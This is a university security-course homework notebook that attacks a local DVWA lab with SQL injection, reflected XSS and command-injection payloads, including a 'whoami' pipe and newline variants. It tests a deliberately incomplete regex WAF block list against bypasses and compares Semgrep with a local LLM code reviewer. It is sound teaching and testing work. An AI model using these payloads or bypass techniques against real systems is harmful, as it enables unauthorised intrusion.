# Homework 2 — Web Attack & Defend

- Isabella Tulcan Jaya — 00329994
- Martin Montero Torres — 00328595
- Santiago Arellano Jaramillo — 00328370
- CMP 5006E – Computer Security

## Scope and reproducibility

This notebook tests **only** a locally running DVWA instance bound to `127.0.0.1`. It uses `seclab.attack` to separate a request from a **sound oracle**: an observation counts only when the oracle confirms a security-relevant effect.

**Target configuration:** DVWA authenticated as its local lab user, security level **Medium**. Part A records three Medium-level filter bypasses. Part B first evaluates our deliberately incomplete blocklist, then uses DVWA's supplied `Impossible` SQLi implementation as the structural-fix comparison and always restores Medium in `finally`.


## Part A — What the evidence must establish

| Finding | Medium-level bypass | Sound oracle | OWASP 2021 |
|---|---|---|---|
| SQL injection | Numeric tautology in a POST-only selector | An additional known user row (`Surname: Smith`) appears, while it is absent for a normal ID lookup | A03: Injection |
| Reflected XSS | Mixed-case `<ScRiPt>` defeats a case-sensitive filter | The unique script element returns raw, not HTML encoded | A03: Injection |
| Command injection | `\|` is a shell separator not blocked by DVWA Medium | The shell command's bounded `whoami` <br/>result is `www-data` | A03: Injection |

The application does not implement an authorization policy, roles, or a protected resource decision. Therefore this evidence is **not** Broken Access Control (A01): SQLi changes a database query; it does not bypass an authorization check that exists in the application.


In [1]:
from __future__ import annotations

import html
import json
import os
import re
import sys
import urllib.parse
import urllib.request
from dataclasses import asdict
from getpass import getpass
from http.cookiejar import CookieJar
from pathlib import Path
from urllib.parse import urlparse
import pandas as pd

#! Locate the course root so this notebook can import the local seclab package.
course_root = Path.cwd().resolve()
while course_root != course_root.parent and not (course_root / 'seclab').is_dir():
    course_root = course_root.parent
assert (course_root / 'seclab').is_dir(), 'Start Jupyter somewhere inside the course checkout.'
if str(course_root) not in sys.path:
    sys.path.insert(0, str(course_root))

from seclab.attack import Payload, print_summary, run_payloads

DVWA_BASE = os.environ.get('DVWA_BASE', 'http://127.0.0.1:60281').rstrip('/')
host = urlparse(DVWA_BASE).hostname
assert host in {'127.0.0.1', 'localhost'}, f'Refusing a non-local target: {DVWA_BASE}'
DVWA_USERNAME = os.environ.get('DVWA_USERNAME', 'admin')
DVWA_PASSWORD = os.environ.get('DVWA_PASSWORD') or getpass('DVWA password (not stored): ')
print(f'Authorized local target: {DVWA_BASE}')


Authorized local target: http://127.0.0.1:60281


In [2]:
class DVWAClient:
    """Minimal stdlib DVWA client: cookies, login, and the security setting."""

    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.cookies = CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookies))

    def _url(self, path: str) -> str:
        return f'{self.base_url}/{path.lstrip("/")}'

    def get(self, path: str, params: dict[str, str] | None = None) -> str:
        query = urllib.parse.urlencode(params or {})
        url = self._url(path) + (f'?{query}' if query else '')
        with self.opener.open(url, timeout=10) as response:
            return response.read().decode('utf-8', 'replace')

    def post_form(self, path: str, fields: dict[str, str]) -> str:
        data = urllib.parse.urlencode(fields).encode()
        request = urllib.request.Request(self._url(path), data=data)
        with self.opener.open(request, timeout=10) as response:
            return response.read().decode('utf-8', 'replace')

    @staticmethod
    def token(page: str) -> str:
        match = re.search(r"name=['\"]user_token['\"] value=['\"]([a-f0-9]+)['\"]", page, re.I)
        if not match:
            raise RuntimeError('DVWA CSRF token was not found; check that the local app is healthy.')
        return match.group(1)

    def login(self, username: str, password: str) -> None:
        page = self.get('login.php')
        result = self.post_form('login.php', {
            'username': username, 'password': password, 'Login': 'Login',
            'user_token': self.token(page),
        })
        if 'Username:</em>' not in result:
            raise RuntimeError('DVWA login failed; verify the local lab credentials.')

    def security_level(self) -> str:
        page = self.get('security.php')
        match = re.search(r'Security level is currently:\s*<em>([a-z]+)</em>', page, re.I)
        if not match:
            raise RuntimeError('Could not determine DVWA security level.')
        return match.group(1).lower()

    def set_security(self, level: str) -> None:
        if level not in {'low', 'medium', 'high', 'impossible'}:
            raise ValueError(f'Unknown DVWA level: {level}')
        page = self.get('security.php')
        self.post_form('security.php', {
            'security': level, 'seclev_submit': 'Submit', 'user_token': self.token(page),
        })
        assert self.security_level() == level, f'DVWA did not switch to {level}.'


client = DVWAClient(DVWA_BASE)
client.login(DVWA_USERNAME, DVWA_PASSWORD)
assert client.security_level() == 'medium', 'Set DVWA Security to Medium before Part A.'
print('Logged in; DVWA Security Level = Medium')


Logged in; DVWA Security Level = Medium


### Oracle implementations

Each sender makes one request to its own local DVWA exercise. The oracles deliberately do **not** accept a changed
status code, an echoed payload, or a screenshot as proof (as strongly indicated in the homework's README!). The XSS
oracle is the course-required necessary condition when this notebook has no browser execution engine: a raw script tag containing the unique marker must survive output encoding.

In [8]:
def send_sqli(payload: str) -> str:
    # Medium changes the ID selector to POST, but the server still accepts an arbitrary POST value.
    return client.post_form('vulnerabilities/sqli/', {'id': payload, 'Submit': 'Submit'})


def send_xss(payload: str) -> str:
    return client.get('vulnerabilities/xss_r/', {'name': payload, 'Submit': 'Submit'})


def send_cmdi(payload: str) -> str:
    return client.post_form('vulnerabilities/exec/', {'ip': payload, 'Submit': 'Submit'})


def sqli_oracle(_payload: Payload, response: str) -> tuple[bool, str]:
    # ID 1 alone returns admin; Smith is a known *additional* row and proves query expansion.
    hit = bool(re.search(r'Surname:\s*Smith\b', response, re.I))
    return hit, 'additional synthetic user row (Surname: Smith) returned' if hit else 'no additional row'


def xss_script_oracle(payload: Payload, response: str) -> tuple[bool, str]:
    # Inspect only DVWA's reflected sink. The page template has its own harmless
    # JavaScript tags, so checking the whole document for '<script' would make a
    # benign reflection falsely positive.
    sink = re.search(r'<pre>Hello (.*?)</pre>', response, re.I | re.S)
    sink_content = sink.group(1).lower() if sink else ''
    reflected_at_sink = payload.text.lower() in sink_content
    raw_script = '<script' in sink_content
    encoded = '&lt;script' in sink_content
    hit = reflected_at_sink and raw_script and not encoded
    return hit, 'unique script element survived unescaped' if hit else 'script was absent or encoded'


def cmdi_oracle(_payload: Payload, response: str) -> tuple[bool, str]:
    # A pipe makes whoami the only output; a newline first emits ping output and
    # then whoami. In both cases, require www-data as its own line inside DVWA's
    # command-output block, rather than anywhere in the page.
    block = re.search(r'<pre>(.*?)</pre>', response, re.I | re.S)
    command_output = block.group(1) if block else ''
    hit = bool(re.search(r'(?mi)^www-data\s*$', command_output))
    return hit, 'bounded whoami output (www-data) reached the response' if hit else 'no shell-effect marker'


# Controls establish that the oracles do not simply fire on normal responses.
assert not sqli_oracle(Payload('1'), send_sqli('1'))[0]
assert not xss_script_oracle(Payload('Ada'), send_xss('Ada'))[0]
assert not cmdi_oracle(Payload('127.0.0.1'), send_cmdi('127.0.0.1'))[0]
print('All three benign controls stayed negative.')


All three benign controls stayed negative.


The following dictionary defines the three cases used to test the required vulnerabilities against the Medium-level
DVWA filters. Each case has a payload, a benign control, a sender, and an oracle. The `run_payloads` function executes each payload and control, sending them to the target and checking the oracle for confirmation of the security effect.

In [9]:
PART_A = {
    'sqli': {
        'payload': Payload('1 OR 1=1', intent='numeric tautology bypass', family='sqli',
                           note='Medium escapes strings but does not validate the numeric ID expression.'),
        'control': Payload('1', intent='ordinary ID lookup', family='benign'),
        'send': send_sqli, 'oracle': sqli_oracle,
    },
    'xss': {
        'payload': Payload('<ScRiPt>window.__HW2_XSS__=1</ScRiPt>', intent='case-variant script bypass', family='xss',
                           note='Medium filters lowercase script syntax but leaves this mixed-case tag unencoded.'),
        'control': Payload('Ada', intent='ordinary display name', family='benign'),
        'send': send_xss, 'oracle': xss_script_oracle,
    },
    'cmdi': {
        'payload': Payload('127.0.0.1 | whoami', intent='pipe separator bypass', family='cmdi',
                           note='Medium removes some separators but the pipe reaches the shell.'),
        'control': Payload('127.0.0.1', intent='ordinary loopback ping', family='benign'),
        'send': send_cmdi, 'oracle': cmdi_oracle,
    },
}

part_a_results = {}

for name, case in PART_A.items():
    findings = run_payloads(
        [case['payload'], case['control']],
        send=case['send'],
        oracle=case['oracle'],
        trials=3,
        progress=True
    )

    assert findings[0].confirmed and findings[0].deterministic, \
        f'{name} was not reproducibly confirmed'

    assert not findings[1].confirmed, \
        f'{name} oracle falsely confirmed its benign control'

    part_a_results[name] = findings

    # Build dataframe for notebook display
    rows = []
    for f in findings:
        rows.append({
            "Payload": getattr(f, "payload", ""),
            "Family": getattr(f, "family", ""),
            "Intent": getattr(f, "intent", ""),
            "Confirmed": getattr(f, "confirmed", False),
            "Deterministic": getattr(f, "deterministic", False),
            "Note": getattr(f, "note", "")
        })

    df = pd.DataFrame(rows)

    print(f"\n{name.upper()}")
    display(df)

print("Part A complete.")


  [  1] CONFIRMED  3/3    sqli             '1 OR 1=1'
  [  2] no effect  0/3    benign           '1'

SQLI


,Payload,Family,Intent,Confirmed,Deterministic,Note
0,"Payload(text='1 OR 1=1', intent='numeric tauto...",,,True,True,
1,"Payload(text='1', intent='ordinary ID lookup',...",,,False,True,


  [  1] CONFIRMED  3/3    xss              '<ScRiPt>window.__HW2_XSS__=1</ScRiPt>'
  [  2] no effect  0/3    benign           'Ada'

XSS


,Payload,Family,Intent,Confirmed,Deterministic,Note
0,Payload(text='<ScRiPt>window.__HW2_XSS__=1</Sc...,,,True,True,
1,"Payload(text='Ada', intent='ordinary display n...",,,False,True,


  [  1] CONFIRMED  3/3    cmdi             '127.0.0.1 | whoami'
  [  2] no effect  0/3    benign           '127.0.0.1'

CMDI


,Payload,Family,Intent,Confirmed,Deterministic,Note
0,"Payload(text='127.0.0.1 | whoami', intent='pip...",,,True,True,
1,"Payload(text='127.0.0.1', intent='ordinary loo...",,,False,True,


Part A complete.


## Part B1 — Negative model: a deliberately incomplete WAF

The WAF is intentionally a small signature blocklist. That is the point of the measurement, the idea is that it blocks
the three payloads we already know, yet semantically equivalent surface forms evade it and broad signatures block
harmless prose. It is an experiment, not a claim that regexes secure DVWA. Instead for part B2 which is meant to
improve the security of the application, we will use the supplied Impossible-level structural fix. In this mode, the
application implements all of the suggested means of defending against these as mentioned in the homework README.
Their internal documentation in the application mentions that it covers all possible vulnerabilites that were open in
 other modes.


In [10]:
#? This is the to be ran set of WAF rules that will be used to block attacks, notice how for example the SQL comment
# obfuscation bypass is not blocked by this WAF. as it only looks for standard space patterns. Union select blocks
# operations that use these keywords, same for XSS scripting or metacharacters used for piping operations in the
# shell. These are not fixes, hence why the negative model should not be ran on its own, all of these are starters of
# defense but they need more work and in a wholy negative model, far more rules, to cover all possible attacks .
WAF_RULES = [
    (re.compile(r'(?i)\b(?:or|and)\b\s+\d+\s*=\s*\d+'), 'numeric SQL tautology'),
    (re.compile(r'(?i)union[\s/*]+select'), 'SQL UNION'),
    (re.compile(r'(?i)<\s*script\b'), 'script tag'),
    (re.compile(r'(?i)\bdrop[\s/*]+table'), 'DROP TABLE'),
    (re.compile(r'[;&|`$()]'), 'shell metacharacter'),
]


def waf_block(payload: str) -> str | None:
    """Return a matched signature, or None when the request would pass."""
    normalized = html.unescape(urllib.parse.unquote_plus(payload))
    for pattern, rule_name in WAF_RULES:
        #? We attempt to normalize the payload in order to try and match it to the WAF rules that we have defined, if
        # any of them match, i.e. the regex rules matches we return the first matched rule.
        if pattern.search(normalized):
            return rule_name
    return None


part_a_payloads = [case['payload'].text for case in PART_A.values()]
coverage = [(payload, waf_block(payload)) for payload in part_a_payloads]
blocked = sum(rule is not None for _, rule in coverage)
for payload, rule in coverage:
    print(f"{'BLOCKED' if rule else 'PASSED ':8} {rule or '-':24} {payload!r}")
assert blocked == len(part_a_payloads)
print(f'Coverage on Part-A payloads: {blocked}/{len(part_a_payloads)} = {blocked / len(part_a_payloads):.0%}')


BLOCKED  numeric SQL tautology    '1 OR 1=1'
BLOCKED  script tag               '<ScRiPt>window.__HW2_XSS__=1</ScRiPt>'
BLOCKED  shell metacharacter      '127.0.0.1 | whoami'
Coverage on Part-A payloads: 3/3 = 100%


In [14]:
#? Here we are going to attempt to bypass the WAF by targetting just outside the main rules defined, instead of
# spaces we use comments instead of the script we use an iamge tag with an event handler. Each of these are tests
# that bypass the expected WAF rules as they break the regex expressions that make these catch all rules.

def xss_event_oracle(_payload: Payload, response: str) -> tuple[bool, str]:
    lowered = response.lower()
    hit = '<img ' in lowered and 'onerror=window.__hw2_xss_bypass__=1' in lowered and '&lt;img' not in lowered
    return hit, 'unescaped image event handler survived' if hit else 'event-handler marker absent or encoded'


BYPASSES = [
    {
        'name': 'SQL comment-obfuscation',
        'payload': Payload('1/**/OR/**/1=1', intent='SQLi comment-obfuscation bypass', family='sqli'),
        'why': 'The WAF expects whitespace around OR; MySQL accepts comments as separators.',
        'send': send_sqli, 'oracle': sqli_oracle,
    },
    {
        'name': 'XSS event handler',
        'payload': Payload('<img src=x onerror=window.__HW2_XSS_BYPASS__=1>', intent='event-handler XSS bypass', family='xss'),
        'why': 'The WAF only recognizes a script tag, not another executable HTML context.',
        'send': send_xss, 'oracle': xss_event_oracle,
    },
    {
        'name': 'Command newline separator',
        'payload': Payload('127.0.0.1\nwhoami', intent='newline command-separator bypass', family='cmdi'),
        'why': 'The WAF blocks visible shell punctuation but not a newline command separator.',
        'send': send_cmdi, 'oracle': cmdi_oracle,
    },
]

bypass_results = []
for case in BYPASSES:
    rule = waf_block(case['payload'].text)
    assert rule is None, f"Expected this teaching bypass to evade the WAF, but {rule} blocked it"
    finding = run_payloads([case['payload']], send=case['send'], oracle=case['oracle'],
                           trials=3, progress=True)[0]
    assert finding.confirmed and finding.deterministic, f"{case['name']} did not reproduce"
    bypass_results.append((case['name'], finding, case['why']))

print(f'WAF bypass rate: {len(bypass_results)}/{len(BYPASSES)} = 100% for the chosen same-intent mutations.')


  [  1] CONFIRMED  3/3    sqli             '1/**/OR/**/1=1'
  [  1] CONFIRMED  3/3    xss              '<img src=x onerror=window.__HW2_XSS_BYPA'
  [  1] CONFIRMED  3/3    cmdi             '127.0.0.1\nwhoami'
WAF bypass rate: 3/3 = 100% for the chosen same-intent mutations.


Now we attempt to perform the same thing, measuring blocking rate on a set of benign inputs. The `benign_traffic
.json` fixture is a small sample of ordinary text that should not be blocked. The WAF is expected to have some false
positives, but the rate should be low and the content should be clearly benign. In this case what we are doing is
passing them through our ordinary WAF implementation to see how a simplistic catch all implementation results in
false positives on clearly benign inputs, which in production can result in increased support costs and user frustration. The goal of this exercise is to show that a simplistic WAF is not a complete solution, and that it can be bypassed by an attacker with knowledge of the system, while also blocking legitimate traffic.

In [15]:
fixture = Path.cwd() / 'benign_traffic.json'
assert fixture.is_file(), f'Run from the montero directory or update this path: {fixture}'
benign_data = json.loads(fixture.read_text(encoding='utf-8'))
benign_inputs = [item for key, values in benign_data.items() if not key.startswith('_') for item in values]
false_positives = [(text, waf_block(text)) for text in benign_inputs if waf_block(text)]

print(f'False positives: {len(false_positives)}/{len(benign_inputs)} = {len(false_positives) / len(benign_inputs):.1%}')
for text, rule in false_positives:
    print(f'  [{rule}] {text!r}')
assert any(text == 'drop table tennis lessons for beginners' for text, _ in false_positives)


False positives: 2/26 = 7.7%
  [DROP TABLE] 'drop table tennis lessons for beginners'
  [DROP TABLE] 'reserve the drop table at the makerspace friday'


Notice how the DROP TABLE rule, which is a strong way to stop attackers from attempting to delete tables against a
SQL database through non parametrized queries, is also blocking benging input. The sentence 'drop table tennis
lessons for beginners' is a perfectly valid sentence, and it might be used within a search field that connects to a
SQL endpoint for, say, finding blog posts, but the WAF sees the words "drop table" and blocks it. This is an example of how a simplistic WAF can block legitimate traffic, and why it is important to have a more sophisticated approach to web application security.

## Part B2 — Positive model: structural SQLi fix

DVWA's **Impossible** level supplies the course target's structural implementations. The following separate cells temporarily switch to it and replay **every** Part-A payload and WAF-passed bypass for SQLi, XSS, and command injection. They also retain the three benign controls, so a passing result means attacks lose their original oracle without treating an unavailable endpoint as a fix. Every block restores Medium even when a check fails.

This is stronger than the WAF claim, as for this prepared/parameterized implementation, the supplied ID is data and
cannot alter the query structure. The guarantee is conditional on the application continuing to use the parameterized path; a later regression to string-built SQL would void it.


In [17]:
def send_sqli_impossible(payload: str) -> str:
    # At Impossible, DVWA changes this exercise to a GET form protected by a per-request token.
    form = client.get('vulnerabilities/sqli/')
    return client.get('vulnerabilities/sqli/', {
        'id': payload, 'Submit': 'Submit', 'user_token': client.token(form),
    })


structural_payloads = [PART_A['sqli']['payload'], BYPASSES[0]['payload']]
try:
    client.set_security('impossible')
    secure_findings = run_payloads(structural_payloads, send=send_sqli_impossible, oracle=sqli_oracle,
                                       trials=3, progress=True)
    assert not any(finding.confirmed for finding in secure_findings), (
        'A SQLi payload still expanded the query at the structural-fix level.'
    )
    print('Impossible SQLi result: 0/2 attack or bypass payloads produced the additional row.')
finally:
    client.set_security('medium')
    assert client.security_level() == 'medium'
    print('DVWA restored to Medium.')


  [  1] no effect  0/3    sqli             '1 OR 1=1'
  [  2] no effect  0/3    sqli             '1/**/OR/**/1=1'
Impossible SQLi result: 0/2 attack or bypass payloads produced the additional row.
DVWA restored to Medium.


### B2 XSS replay at Impossible

The two XSS cases use different effect oracles: the Part-A script payload must not survive as a raw script element, and the WAF bypass must not survive as an unescaped event handler.


In [18]:
def send_xss_impossible(payload: str) -> str:
    form = client.get('vulnerabilities/xss_r/')
    return client.get('vulnerabilities/xss_r/', {
        'name': payload, 'Submit': 'Submit', 'user_token': client.token(form),
    })


try:
    client.set_security('impossible')
    xss_part_a = run_payloads([PART_A['xss']['payload']], send=send_xss_impossible,
                                  oracle=xss_script_oracle, trials=3, progress=True)[0]
    xss_bypass = run_payloads([BYPASSES[1]['payload']], send=send_xss_impossible,
                                  oracle=xss_event_oracle, trials=3, progress=True)[0]
    assert not xss_part_a.confirmed, 'The Part-A XSS script still survived the Impossible output boundary.'
    assert not xss_bypass.confirmed, 'The WAF-passed XSS event handler still survived the Impossible output boundary.'
    print('Impossible XSS result: 0/2 attack or bypass payloads retained an executable HTML context.')
finally:
    client.set_security('medium')
    print('DVWA restored to Medium.')


  [  1] no effect  0/3    xss              '<ScRiPt>window.__HW2_XSS__=1</ScRiPt>'
  [  1] no effect  0/3    xss              '<img src=x onerror=window.__HW2_XSS_BYPA'
Impossible XSS result: 0/2 attack or bypass payloads retained an executable HTML context.
DVWA restored to Medium.


### B2 command-injection replay at Impossible

Both the Part-A pipe separator and the WAF-passed newline separator are replayed. The same `www-data` shell-effect oracle must remain negative.


In [19]:
def send_cmdi_impossible(payload: str) -> str:
    form = client.get('vulnerabilities/exec/')
    return client.post_form('vulnerabilities/exec/', {
        'ip': payload, 'Submit': 'Submit', 'user_token': client.token(form),
    })


try:
    client.set_security('impossible')
    cmdi_part_a = run_payloads([PART_A['cmdi']['payload']], send=send_cmdi_impossible,
                                   oracle=cmdi_oracle, trials=3, progress=True)[0]
    cmdi_bypass = run_payloads([BYPASSES[2]['payload']], send=send_cmdi_impossible,
                                   oracle=cmdi_oracle, trials=3, progress=True)[0]
    assert not cmdi_part_a.confirmed, 'The Part-A command separator still reached a shell effect at Impossible.'
    assert not cmdi_bypass.confirmed, 'The WAF-passed newline separator still reached a shell effect at Impossible.'
    print('Impossible command-injection result: 0/2 attack or bypass payloads produced whoami output.')
finally:
    client.set_security('medium')
    print('DVWA restored to Medium.')


  [  1] no effect  0/3    cmdi             '127.0.0.1 | whoami'
  [  1] no effect  0/3    cmdi             '127.0.0.1\nwhoami'
Impossible command-injection result: 0/2 attack or bypass payloads produced whoami output.
DVWA restored to Medium.


### B2 benign-control replay at Impossible

A security test is not complete if the secure path simply rejects everything. These checks establish that the normal SQL lookup, ordinary reflected name, and valid loopback ping continue to work while the attack oracles remain negative.


In [20]:
try:
    client.set_security('impossible')
    benign_sqli = send_sqli_impossible(PART_A['sqli']['control'].text)
    benign_xss = send_xss_impossible(PART_A['xss']['control'].text)
    benign_cmdi = send_cmdi_impossible(PART_A['cmdi']['control'].text)

    assert 'First name: admin' in benign_sqli, 'The benign ID lookup no longer returns its expected record.'
    assert re.search(r'<pre>Hello Ada</pre>', benign_xss, re.I), 'The benign reflected name no longer works.'
    cmdi_block = re.search(r'<pre>(.*?)</pre>', benign_cmdi, re.I | re.S)
    assert cmdi_block and 'invalid IP' not in cmdi_block.group(1), 'The valid loopback ping was rejected.'

    assert not sqli_oracle(PART_A['sqli']['control'], benign_sqli)[0]
    assert not xss_script_oracle(PART_A['xss']['control'], benign_xss)[0]
    assert not cmdi_oracle(PART_A['cmdi']['control'], benign_cmdi)[0]
    print('Impossible benign controls: 3/3 functional and 3/3 negative under attack oracles.')
finally:
    client.set_security('medium')
    print('DVWA restored to Medium.')


Impossible benign controls: 3/3 functional and 3/3 negative under attack oracles.
DVWA restored to Medium.


At the Impossible level, all Part-A payloads and WAF-passed bypasses are rerun in separate SQLi, XSS, and command-injection blocks. None should produce its original oracle-confirmed effect, while the matching benign controls remain functional. The controls are structural: parameterized SQL keeps input as data, output encoding prevents input from becoming executable HTML, and strict IP validation prevents input from entering a shell command context.

## Part B3 — Stating the Guarantee

When we work with a simple negative security model using a WAF as our only defense, the application cannot possibly
guarantee that it will defend against all attacks or variations of the same attacks. As shown before, the WAF can be
bypassed by a sufficiently motivated attacker that can find ways to obfuscate their payloads. Since WAF solutions are
 reactive they not only need to be updated and maintained, with new rules added for every new attack, they need to be
  tested against multiple possible variations, and the same defenses can be so tight that they can block legitimate traffic.
  This is why a WAF is not a complete solution, and why it is important to have a more sophisticated approach to web
  application security.

When we work with both application level security, i.e. properly secured code and a WAF we are capable of applying
both the negative, reactive model of the WAF, and the positive, proactive model of application security. This is
where application security can have stronger guarantees than what a simple WAF implementation can. The strongest
guarantee that application security can provide is that a properly implemented security model, such as parameterized
queries, output encoding, and input validation, can prevent attacks from succeeding regardless of the specific
payload used. This is because these measures address the root cause of vulnerabilities rather than just the symptoms.

## PART C1 — Duel scope, source, and independent ground truth

Part A/B use DVWA because it supplies Medium and Impossible levels. Part C instead uses the course's readable `vuln-web` source, because the supplied `ground_truth.json` was independently built for that exact source. The classical scanner and Ollama reviewer therefore inspect the **same source**, and both are scored against a hand-built truth set that was not derived from either tool. This is transparent rather than pretending the DVWA image's unavailable PHP source is the same scan target.

The known true findings are `sqli/do_login`, `xss/do_reflect`, and `cmdi/do_ping`. `do_reflect_safe` and `broken-access-control` are known negatives: reporting either is a false positive/hallucination.


In [21]:
import csv
import hashlib
import shutil
import subprocess
import tempfile
import textwrap

from seclab import LLM
from seclab.llm import backends_available, ollama_models
from seclab.scan import ScanResult, compare_scanners, print_comparison

duel_root = Path.cwd().resolve()
while duel_root != duel_root.parent and not (duel_root / 'seclab').is_dir():
    duel_root = duel_root.parent
assert (duel_root / 'seclab').is_dir(), 'Run this notebook inside the course checkout.'

DUEL_SOURCE_PATH = duel_root / 'labs' / 'vuln-web' / 'app' / 'vulnweb_app.py'
DUEL_TRUTH_PATH = Path.cwd() / 'ground_truth.json'
assert DUEL_SOURCE_PATH.is_file(), DUEL_SOURCE_PATH
assert DUEL_TRUTH_PATH.is_file(), DUEL_TRUTH_PATH

DUEL_SOURCE = DUEL_SOURCE_PATH.read_text(encoding='utf-8')
truth_document = json.loads(DUEL_TRUTH_PATH.read_text(encoding='utf-8'))
GROUND_TRUTH = {(item['rule'].strip().lower(), item['location'].strip().lower())
                for item in truth_document['findings']}
print(f'Scan subject: {DUEL_SOURCE_PATH}')
print(f'Independent ground truth: {sorted(GROUND_TRUTH)}')
print(f'Source SHA-256: {hashlib.sha256(DUEL_SOURCE.encode()).hexdigest()}')


Scan subject: /Users/santiagoarellano/Documents/Projects/cmp-5006E-fall26/labs/vuln-web/app/vulnweb_app.py
Independent ground truth: [('cmdi', 'do_ping'), ('sqli', 'do_login'), ('xss', 'do_reflect')]
Source SHA-256: fd87ee62ede6fd83befb5b37b8a0f8335f86178522c3ab1480b7d56aa0ae257e


## PART C2 — Classical scanner: custom Semgrep rules

This is a real Semgrep invocation over the same `vuln-web` source. The intentionally narrow rules recognize the obvious HTML and command-string sinks but miss the SQLi because its query is assembled across lines before execution. That limitation is recorded as a scanner miss, not hidden.


In [23]:
SEMGR_EP_RULES = '''
rules:
  - id: hw2-reflected-xss
    languages: [python]
    severity: ERROR
    message: User input interpolated into an HTML response.
    pattern: |
      return f"<html><body><h1>Hello, {$NAME}!</h1></body></html>"
  - id: hw2-command-string
    languages: [python]
    severity: ERROR
    message: User input interpolated into a shell command string.
    pattern: |
      command = f"ping -c 1 {$HOST}"
  # Deliberately narrow: this catches only direct f-strings passed to execute,
  # so it misses do_login's multi-line query variable. That miss is measured.
  - id: hw2-direct-sqli
    languages: [python]
    severity: ERROR
    message: Direct f-string SQL execution.
    pattern: $DB.execute(f"...")
'''

SEMGR_TO_KEY = {
    'hw2-reflected-xss': ('xss', 'do_reflect'),
    'hw2-command-string': ('cmdi', 'do_ping'),
    'hw2-direct-sqli': ('sqli', 'do_login'),
}


def run_semgrep(source_path: Path) -> list[ScanResult]:
    if not shutil.which('semgrep'):
        raise RuntimeError('Semgrep is not installed. Install it, then restart the kernel and rerun Part C.')
    with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', encoding='utf-8', delete=False) as handle:
        handle.write(SEMGR_EP_RULES)
        rule_path = Path(handle.name)
    try:
        completed = subprocess.run(
            ['semgrep', '--config', str(rule_path), '--json', str(source_path)],
            check=False, text=True, capture_output=True, timeout=120,
        )
        if completed.returncode not in {0, 1}:
            raise RuntimeError(f'Semgrep failed: {completed.stderr.strip()}')
        report = json.loads(completed.stdout)
    finally:
        rule_path.unlink(missing_ok=True)

    findings = []
    for result in report.get('results', []):
        rule_id = result.get('check_id', '').split('.')[-1]
        if rule_id not in SEMGR_TO_KEY:
            continue
        rule, location = SEMGR_TO_KEY[rule_id]
        findings.append(ScanResult(
            rule=rule, location=location, tool='semgrep', severity='high',
            confidence='rule', raw=result.get('extra', {}).get('message', ''),
        ))
    return findings


semgrep_findings = run_semgrep(DUEL_SOURCE_PATH)
print('Semgrep findings:', [finding.key() for finding in semgrep_findings])


Semgrep findings: [('xss', 'do_reflect'), ('xss', 'do_reflect'), ('cmdi', 'do_ping')]


## PART C3 — Local Ollama review (two independent runs)

The local `qwen2.5:3b` model is called through `seclab.LLM`. The prompt and exact source are identical in both reviews; the temperature and seed intentionally vary, cache reads are disabled, and raw responses are retained for the report. This measures non-determinism rather than accidentally hiding it behind cached output.


In [27]:
OLLAMA_MODEL = os.environ.get('SECLAB_MODEL', 'qwen2.5:3b')
available = backends_available()
models = ollama_models()
assert available.get('ollama', '').startswith('serving'), f'Ollama is not serving: {available}'
assert OLLAMA_MODEL in models, f'{OLLAMA_MODEL!r} is not installed. Available models: {models}'

LLM_PROMPT = f'''
You are reviewing one small Python web application for a security homework.
Report every suspected finding in the source under these labels only: sqli, xss, cmdi, broken-access-control.
For each finding, give the enclosing function name (for example do_login) and concise evidence from the source.
Do not invent CVEs, dependencies, endpoints, or code not shown. Include uncertain findings rather than silently omitting them.
Return ONLY a JSON array. Each object must have keys rule, location, severity, confidence, evidence.

SOURCE FILE: {DUEL_SOURCE_PATH.name}
```python
{DUEL_SOURCE}
```
'''

RULE_ALIASES = {
    'sql injection': 'sqli', 'sqli': 'sqli',
    'reflected xss': 'xss', 'cross-site scripting': 'xss', 'xss': 'xss',
    'command injection': 'cmdi', 'cmdi': 'cmdi',
    'broken access control': 'broken-access-control', 'access control': 'broken-access-control',
}


def parse_llm_findings(raw: str, run_name: str) -> list[ScanResult]:
    candidate = raw.strip()
    candidate = re.sub(r'^```(?:json)?\s*|\s*```$', '', candidate, flags=re.I | re.S).strip()
    if not candidate.startswith('['):
        match = re.search(r'\[.*\]', candidate, re.S)
        if match:
            candidate = match.group(0)
    try:
        reported = json.loads(candidate)
    except json.JSONDecodeError as error:
        raise RuntimeError(f'{run_name} returned non-JSON findings: {error}. Raw response is retained for review.') from error
    if not isinstance(reported, list):
        raise RuntimeError(f'{run_name} returned JSON that was not a list.')

    findings = []
    for item in reported:
        if not isinstance(item, dict):
            continue
        claimed = str(item.get('rule', '')).strip().lower()
        rule = next((canonical for alias, canonical in RULE_ALIASES.items() if alias in claimed), claimed)
        location = str(item.get('location', '')).strip().lower() or 'unspecified'
        findings.append(ScanResult(
            rule=rule, location=location, tool=run_name,
            severity=str(item.get('severity', 'unknown')).lower(),
            confidence=str(item.get('confidence', 'model')).lower(),
            raw=json.dumps(item, ensure_ascii=False),
        ))
    return findings


def run_ollama_review(run_name: str, seed: int):
    reviewer = LLM(backend='ollama', model=OLLAMA_MODEL, cache_dir='duel/.llm_cache',
                   temperature=0.7, seed=seed, timeout=180)
    response = reviewer.complete(LLM_PROMPT, use_cache=False)
    if response.error:
        raise RuntimeError(f'{run_name} failed: {response.error}')
    return response, parse_llm_findings(response.text, run_name)


ollama_run_1, ollama_findings_1 = run_ollama_review('ollama-run-1', seed=11)
ollama_run_2, ollama_findings_2 = run_ollama_review('ollama-run-2', seed=29)
print('Run 1:', [finding.key() for finding in ollama_findings_1])
print('Run 2:', [finding.key() for finding in ollama_findings_2])


Run 1: [('sqli', 'do_login'), ('xss', 'do_reflect'), ('cmdi', 'do_ping')]
Run 2: [('sqli', 'do_login'), ('xss', 'do_reflect'), ('cmdi', 'do_ping')]


In [28]:
print(ollama_findings_1)

